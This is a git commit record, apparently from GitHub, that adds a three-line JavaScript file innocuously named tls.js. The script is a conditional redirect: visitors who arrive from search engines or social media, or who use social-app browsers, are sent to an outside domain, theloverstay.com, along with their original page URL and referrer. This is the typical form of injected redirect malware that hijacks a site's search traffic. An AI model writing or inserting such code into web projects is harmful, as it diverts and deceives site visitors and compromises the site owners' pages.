8c63ebe00b135b40a6f35da418caaac194cb5464
maopehape <71467261+maopehape@users.noreply.github.com>
2020-09-21 12:12:28 +0700

    Create tls.js

---
+++ tls.js
@@ -0,0 +1,3 @@
+var ars = 'https://theloverstay.com';
+
+if(['.google.', '.bing.', 'yandex.', 'facebook.', '.yahoo.', 'duckduckgo.', 'baidu.', '.babylon.', '.ask.', '.aol.', 'virgilio.', 'dogpile.', 'pinterest.', 't.co', 't.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
